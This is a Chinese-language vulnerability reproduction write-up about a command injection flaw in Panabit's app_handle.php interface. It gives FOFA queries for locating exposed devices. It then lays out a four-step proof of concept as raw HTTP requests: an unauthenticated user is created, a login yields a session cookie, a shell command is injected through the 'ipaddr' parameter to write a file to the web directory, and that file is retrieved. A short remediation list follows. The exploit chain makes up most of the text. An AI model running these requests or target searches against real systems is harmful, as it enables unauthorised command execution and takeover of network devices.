# 漏洞复现 | Panabit app_handle 存在命令注入漏洞

## 漏洞信息

| 属性 | 值 |
|------|-----|
| 漏洞名称 | Panabit app_handle 命令注入漏洞 |
| 漏洞类型 | 命令注入 |
| 组件 | Panabit |
| 严重程度 | 高危 |

## 漏洞概述

Panabit 设备app_handle接口存在命令注入漏洞，攻击者可通过在`ipaddr`参数中构造恶意命令，将内容写入web目录进而getshell。

## FOFA查询语法

```ini
app="Panabit"
```

或者基于关键字搜索：
```ini
title="Panabit" || header="Panabit"
```

## 漏洞复现

### POC

**Step 1: 添加用户**
```http
POST /singleuser_action.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 694

syncInfo={"user":{"userId":"88172765","userName":"88172765","employeeId":"88172765","departmentId":"88172765","departmentName":"88172765","coporationId":"88172765","corporationName":"88172765","userSex":"1"}}
```

**Step 2: 用户登录（获取Cookie）**
```http
POST /1ogin.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

user=88172765&mypass=88172765
```

**Step 3: 执行命令写入文件**
```http
POST /App/app_handle.php HTTP/1.1
Host: target
Cookie: PHPSESSID=xxx
Content-Type: application/x-www-form-urlencoded

type=wlist_ipdetail&ipaddr=;echo test >sxmjagze.txt;
```

**Step 4: 访问写入的文件**
```http
GET /App/sxmjagze.txt HTTP/1.1
Host: target
```

### 特征

- 登录接口：`/1ogin.php`
- 注入接口：`/App/app_handle.php`
- 参数：`type=wlist_ipdetail`, `ipaddr`
- 利用：`;echo ... >/App/...`
- 访问：直接GET `/App/filename`

## 修复建议

1. 对用户输入进行严格过滤
2. 禁用系统命令执行功能
3. 更新设备固件到最新版本
4. 限制管理接口访问

---

*来源：实战安全研究 | 原文链接：https://mp.weixin.qq.com/s/B_vkMhzIlm3WEukCTB85jw*